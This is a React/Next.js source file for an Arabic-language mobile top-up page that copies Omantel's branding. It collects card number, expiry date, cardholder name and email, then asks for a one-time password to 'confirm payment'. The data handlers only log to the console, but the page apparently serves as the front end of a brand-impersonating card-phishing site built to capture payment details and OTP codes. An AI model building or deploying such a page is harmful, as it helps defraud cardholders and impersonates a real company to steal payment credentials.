"use client"

import type React from "react"

import type { ReactElement } from "react"
import {
  Menu,
  Search,
  ShoppingBag,
  User,
  Phone,
  Facebook,
  Instagram,
  Twitter,
  Youtube,
  MessageSquare,
  PhoneCall,
  ArrowRight,
} from "lucide-react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import Link from "next/link"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
  DialogFooter,
  DialogClose,
} from "@/components/ui/dialog"
import { useState } from "react"

export default function OmantelPage(): ReactElement {
  const [otp, setOtp] = useState("")

  const handleFormSubmit = (e: React.FormEvent<HTMLFormElement>): void => {
    e.preventDefault()
    // This would typically handle the main form validation
    // before opening the dialog. For now, it does nothing
    // as the DialogTrigger handles the opening.
    console.log("Main form submitted, opening OTP dialog.")
  }

  const handleOtpSubmit = (): void => {
    // Handle OTP verification logic here
    console.log("OTP submitted:", otp)
    // You would close the dialog programmatically on success
  }

  return (
    <div className="bg-white font-sans">
      <header className="flex items-center justify-between p-4 border-b border-gray-200 sticky top-0 bg-white z-10">
        <Button variant="ghost" size="icon" className="text-orange-500">
          <Menu className="h-6 w-6" />
          <span className="sr-only">Menu</span>
        </Button>
        <div className="flex items-center gap-2">
          <Button variant="ghost" size="icon" className="text-orange-500">
            <User className="h-6 w-6" />
            <span className="sr-only">Profile</span>
          </Button>
          <Button variant="ghost" size="icon" className="text-orange-500">
            <ShoppingBag className="h-6 w-6" />
            <span className="sr-only">Cart</span>
          </Button>
          <Button variant="ghost" size="icon" className="text-orange-500">
            <Search className="h-6 w-6" />
            <span className="sr-only">Search</span>
          </Button>
        </div>
        <OmantelLogo className="h-6 text-purple-700" />
      </header>

      <main className="bg-gray-100 p-4 md:p-8">
        <div className="max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden p-6 space-y-6">
          <div className="flex items-center gap-2 text-orange-500 font-semibold">
            <ArrowRight className="h-4 w-4" />
            <Link href="#">إلى الخلف</Link>
          </div>

          <div className="text-center space-y-2">
            <h1 className="text-3xl font-bold text-gray-800">أعد تعبئة رصيدك الآن!</h1>
            <p className="text-gray-500">بخطوات بسيطة وسريعة دون الحاجة إلى تسجيل الدخول</p>
          </div>

          <div className="border-t border-b border-gray-200 py-4 flex justify-between items-center">
            <span className="text-gray-500">رقم الهاتف:</span>
            <span className="font-bold text-lg tracking-wider">92111000</span>
          </div>

          <Dialog>
            <form onSubmit={handleFormSubmit} className="space-y-4 text-right">
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label htmlFor="card-number" className="text-sm font-medium text-gray-700 block">
                    رقم البطاقة
                  </label>
                  <Input id="card-number" type="text" />
                </div>
                <div className="space-y-2">
                  <label htmlFor="expiry-date" className="text-sm font-medium text-gray-700 block">
                    تاريخ انتهاء الصلاحية
                  </label>
                  <Input id="expiry-date" type="text" placeholder="MM/YY" />
                </div>
              </div>

              <div className="space-y-2">
                <label htmlFor="card-holder" className="text-sm font-medium text-gray-700 block">
                  اسم حامل البطاقة
                </label>
                <Input id="card-holder" type="text" />
              </div>

              <div className="space-y-2">
                <label htmlFor="email" className="text-sm font-medium text-gray-700 block">
                  البريد الإلكتروني
                </label>
                <Input id="email" type="email" />
              </div>

              <DialogTrigger asChild>
                <Button type="button" className="w-full bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold mt-6">
                  تعبئة الرصيد (5.000 ر.ع)
                </Button>
              </DialogTrigger>
            </form>

            <DialogContent className="sm:max-w-[425px] text-right">
              <DialogHeader>
                <DialogTitle>التحقق من كلمة المرور لمرة واحدة</DialogTitle>
                <DialogDescription>
                  لقد أرسلنا كلمة مرور لمرة واحدة إلى رقم هاتفك المسجل. يرجى إدخالها أدناه للمتابعة.
                </DialogDescription>
              </DialogHeader>
              <div className="grid gap-4 py-4">
                <div className="space-y-2">
                  <label htmlFor="otp" className="text-sm font-medium text-gray-700 block">
                    كلمة المرور لمرة واحدة
                  </label>
                  <Input
                    id="otp"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value)}
                    className="col-span-3 text-center tracking-widest"
                    maxLength={6}
                  />
                </div>
              </div>
              <DialogFooter>
                <DialogClose asChild>
                  <Button type="button" variant="secondary">
                    إلغاء
                  </Button>
                </DialogClose>
                <Button type="button" onClick={handleOtpSubmit}>
                  تأكيد الدفع
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        </div>
      </main>

      <footer className="bg-[#0c1427] text-white pt-8 pb-4 px-6">
        <div className="max-w-4xl mx-auto">
          <div className="relative mb-8">
            <h3 className="text-lg font-semibold mb-4">جهات التواصل</h3>
            <div className="space-y-3">
              <div className="flex items-center gap-3">
                <PhoneCall className="h-5 w-5 text-orange-500" />
                <span>1234 رقم مركز الاتصال</span>
              </div>
              <div className="flex items-center gap-3">
                <PhoneCall className="h-5 w-5 text-orange-500" />
                <span>1235 مركز اتصال الشركات</span>
              </div>
            </div>
            <div className="absolute -top-4 left-0 bg-blue-600 p-3 rounded-full shadow-lg">
              <MessageSquare className="h-6 w-6 text-white" />
            </div>
          </div>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-sm">
            <div>
              <h4 className="font-bold mb-3">الشركة</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    عن عمانتل
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    الاستدامة
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    الوظائف
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المركز الإعلامي
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    مختبرات عمانتل للابتكار
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-3">خدمة المشتركين</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المساعدة
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    قنوات الدفع
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المنافذ
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    التغطية
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-3">الشركات</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المستثمرون
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    iSupplier
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    أعمال الجملة
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المناقصات الإلكترونية
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    تصاريح الحفريات
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-3">السياسات</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    سياسة الخصوصية
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    سياسة الإبلاغ عن المخالفات
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    إغلاق شبكة الجيل الثالث
                  </Link>
                </li>
              </ul>
            </div>
          </div>

          <div className="mt-10 text-center">
            <h4 className="font-semibold mb-4">تابعونا على منصات التواصل الاجتماعي</h4>
            <div className="flex justify-center gap-4">
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Facebook className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Instagram className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Twitter className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Youtube className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Phone className="h-5 w-5" />
              </Link>
            </div>
          </div>

          <div className="border-t border-gray-700 mt-8 pt-6 text-center text-xs text-gray-400 space-y-4">
            <div className="flex flex-col md:flex-row justify-center gap-x-6 gap-y-2">
              <Link href="#" className="hover:text-orange-400">
                الملكية الفكرية
              </Link>
              <Link href="#" className="hover:text-orange-400">
                اتفاقية العملاء الموحدة
              </Link>
              <Link href="#" className="hover:text-orange-400">
                خارطة الموقع
              </Link>
            </div>
            <div className="flex items-center justify-center gap-2">
              <span>Oman Telecommunications Company © 2024</span>
              <OmantelLogo className="h-4 text-white" />
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}

function OmantelLogo(props: React.SVGProps<SVGSVGElement>): ReactElement {
  return (
    <svg {...props} viewBox="0 0 100 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Omantel">
      <text x="0" y="15" fontFamily="Arial, sans-serif" fontSize="16" fontWeight="bold" fill="currentColor">
        Omantel
      </text>
    </svg>
  )
}
